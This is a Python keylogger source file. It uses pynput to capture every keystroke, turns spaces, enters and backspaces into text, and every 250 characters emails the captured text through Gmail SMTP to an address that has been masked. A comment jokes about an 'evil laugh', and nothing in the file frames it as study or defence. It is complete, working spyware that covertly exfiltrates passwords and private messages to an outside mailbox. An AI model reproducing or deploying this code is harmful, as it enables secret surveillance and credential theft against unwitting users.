from pynput.keyboard import Listener
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib

keyCapture = ""

def keylog(key):
    global keyCapture
    key = str(key).replace("'", "")

    if key == 'Key.space':
        key = ' '
    elif key == 'Key.enter':
        key = '\n'
    elif key == 'Key.shift':
        key = ''
    elif key == 'Key.backspace':
        key = '<'#when the user delete characteres

    keyCapture += key

    if len(keyCapture) >= 250:
        send_email(keyCapture)
        keyCapture = ""

def send_email(content):
    from_email = "************@gmail.com"
    to_email = "***********@gmail.com"
    password = "***********"#a passwd you don't even know AHAHAHAH "EVIL LAUGH" :)
    
    message = MIMEMultipart('')
    message['Subject'] = 'Keycaptured'
    message['From'] = from_email
    message['To'] = to_email
    message.attach(MIMEText(content, 'plain')) 

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(from_email, password)
    server.sendmail(from_email, to_email, message.as_string())
    server.quit()

with Listener(on_press=keylog) as l:
    l.join()